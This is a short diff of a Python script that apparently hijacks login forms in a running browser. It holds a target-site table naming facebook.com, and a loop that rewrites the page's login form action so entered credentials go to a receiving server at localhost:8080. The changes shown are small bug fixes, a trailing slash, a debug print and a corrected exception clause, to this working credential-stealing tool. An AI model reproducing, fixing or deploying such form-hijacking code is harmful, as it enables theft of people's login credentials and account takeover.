@@ -3,7 +3,7 @@ import time
 from urllib.parse import urlparse
 import urllib
 
-data_receiver="http://localhost:8080"
+data_receiver="http://localhost:8080/"
 
 target_sites={}
 target_sites["www.facebook.com"]={
@@ -71,11 +71,12 @@ while True:
                     print("[*] Start Hack!")
                     login_index=target_sites[url.hostname]["login_form_index"]
                     login_page=urllib.parse.quote(browser.LocationUrl)
+                    print(login_page)
                     browser.Document.forms[login_index].action="%s%s" % (data_receiver,login_page)
                     target_sites[url.hostname]["owned"]=True
                     print("[*] End Hack!")
 
-                except e:
+                except Exception as e:
                     print(e)
     time.sleep(5)
 
